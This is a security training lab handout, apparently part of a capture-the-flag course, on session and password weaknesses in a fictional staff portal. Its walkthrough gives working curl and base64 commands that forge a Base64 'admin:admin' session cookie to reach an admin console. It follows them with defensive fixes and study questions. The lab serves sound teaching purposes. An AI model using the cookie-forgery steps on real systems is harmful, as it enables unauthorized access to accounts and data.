# Secure Authentication: Sessions, MFA, and Password Storage

## Before You Begin

- [ ] You have the exercise panel open
- [ ] You can sign in to the practice portal
- [ ] You can open browser developer tools, or use `curl`
- [ ] You will use only the fictional demo account
- [ ] You will not paste a real password or session cookie anywhere

!!! note "A login is not a session design"
    A portal can check a password correctly and still trust a session cookie
    that the user can edit. This lab separates those two ideas.

## Scenario

A community centre has a new staff portal. Volunteers sign in to check
schedules and reports. The administrator account has MFA enabled, but the
developer shipped a debug session format and the server trusts the role written
in the cookie.

You have the demo staff account. Your job is to see whether you can reach the
admin console, recover the training token, and explain why MFA did not stop you.

## Background

| Term | Meaning |
|---|---|
| **Authentication** | Proving who you are, usually with a password, passkey, or MFA. |
| **Authorization** | Deciding what that identity may do. |
| **Session** | The server's record that you signed in, usually referenced by a cookie. |
| **Cookie attributes** | `HttpOnly`, `Secure`, and `SameSite` limit how a cookie is exposed and sent. |
| **Password hash** | A one-way transformation used to check a password without storing it. |

A fast hash such as MD5 or SHA-1 is designed to be quick. That is useful for
checksums and terrible for passwords. Password storage needs a slow, salted
hash such as Argon2id, bcrypt, or scrypt.

## Walkthrough

### Step 1: Sign in

Open the exercise page and use the demo account shown there:

```text
amara / Library2026!
```

After signing in, the portal shows a dashboard and your session cookie.

### Step 2: Inspect the cookie

In the browser, open developer tools and find the `session` cookie under
**Application** or **Storage**. With `curl`:

```bash
curl -i -X POST \
  -d 'user=amara&password=Library2026!' \
  http://identity-auth.lab:8080/login
```

Look for the `Set-Cookie` header. The cookie has no `HttpOnly`, `Secure`, or
`SameSite` attribute. That is one problem. The bigger problem is what the value
means.

### Step 3: Decode the session value

The cookie is Base64. Decode it:

```bash
echo 'YW1hcmE6c3RhZmY=' | base64 -d
```

You should see:

```text
amara:staff
```

The cookie is not a random session identifier. It is a username and role that
the client can read and change.

### Step 4: Change the role

Replace the role with `admin` and encode it again:

```bash
printf 'admin:admin' | base64
```

The result is a new cookie value. In the browser, edit the `session` cookie. With
`curl`, send it as a header:

```bash
curl -s -H 'Cookie: session=YWRtaW46YWRtaW4=' \
  http://identity-auth.lab:8080/admin
```

### Step 5: Recover the token

The admin console should now open. Copy the `OCR{...}` training token into the
flag box.

### Step 6: Explain why MFA did not help

MFA was checked when the administrator signed in. It was **not** checked when a
request arrived with a cookie claiming to be an administrator. The server
trusted the claim. That is the core failure.

## What Just Happened?

- The session cookie contained authorization data, not just an identifier.
- The client could change the role and the server accepted it.
- The cookie lacked `HttpOnly`, `Secure`, and `SameSite`.
- MFA protected one login event, not the session or the admin action.
- The password table used a fast hash, which is a separate weakness.

## The Fixes

| Problem | Fix |
|---|---|
| Client-controlled role | Store a random, opaque session ID server-side and look up the user and role on every request |
| Cookie theft | Set `HttpOnly`, `Secure`, and `SameSite`; use short lifetimes |
| Session fixation | Rotate the session ID at sign-in and after privilege changes |
| MFA bypass | Bind MFA to the session and require re-authentication for sensitive actions |
| Weak password storage | Use Argon2id, bcrypt, or scrypt with a unique salt and a tuned work factor |
| Unlimited guessing | Add rate limiting, lockout with care, and breached-password checks |

## If You Do Not Have Developer Tools

Use `curl` for the whole flow. The login request prints the cookie; the admin
request accepts the forged value. You can decode and encode Base64 with
`base64 -d` and `base64`, or with CyberChef's **From Base64** and **To Base64**
operations.

## Analysis Questions

**1. What is the difference between authentication and authorization in this
lab?**

**2. Why is a Base64-encoded `user:role` value not a session?**

**3. Which cookie attribute would have limited the impact of a stolen cookie?**

**4. Why did MFA not protect the admin console?**

**5. What would you store on the server to make the session trustworthy?**

**6. Why is MD5 unsuitable for password storage, even with a salt?**

**7. What would you log to detect a forged or replayed session?**

## Accessibility

- The lab works in a browser or a terminal. You can complete it with a keyboard.
- Cookie values are text. Copy and paste them instead of retyping.
- If developer tools are difficult to navigate, use the `curl` path.
- The page source contains a debug note about the session format. It is safe to
  read and does not reveal the flag.
